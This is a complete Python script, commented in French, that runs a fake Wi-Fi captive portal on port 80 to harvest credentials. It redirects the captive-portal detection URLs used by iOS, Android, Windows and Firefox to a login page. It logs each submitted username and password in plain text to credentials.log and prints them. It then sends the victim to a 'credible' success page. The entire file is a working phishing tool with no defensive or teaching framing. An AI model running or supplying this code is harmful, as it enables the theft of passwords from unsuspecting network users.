#!/usr/bin/env python3
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime

class CaptiveHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        # Lire les données envoyées par le formulaire
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = parse_qs(post_data)

        # Extraire les credentials
        username = params.get('username', [''])[0]
        password = params.get('password', [''])[0]

        # Logger dans un fichier
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open('credentials.log', 'a') as f:
            f.write(f'[{timestamp}] User: {username} | Pass: {password}\n')
        
        print(f'[!] CREDENTIALS CAPTUREES: {username} / {password}')

        # Rediriger vers une page "merci" ou une erreur crédible
        self.send_response(302)
        self.send_header('Location', '/success.html')
        self.end_headers()

    def do_GET(self):
        # Répondre aux requêtes de détection de portail captif
        captive_urls = [
            '/hotspot-detect.html',      # iOS
            '/generate_204',              # Android
            '/connecttest.txt',           # Windows
            '/canonical.html'             # Firefox
        ]
        if self.path in captive_urls:
            self.send_response(302)
            self.send_header('Location', '/index.html')
            self.end_headers()
        else:
            super().do_GET()

httpd = HTTPServer(('0.0.0.0', 80), CaptiveHandler)
print('[*] Portail captif actif sur le port 80...')
httpd.serve_forever()
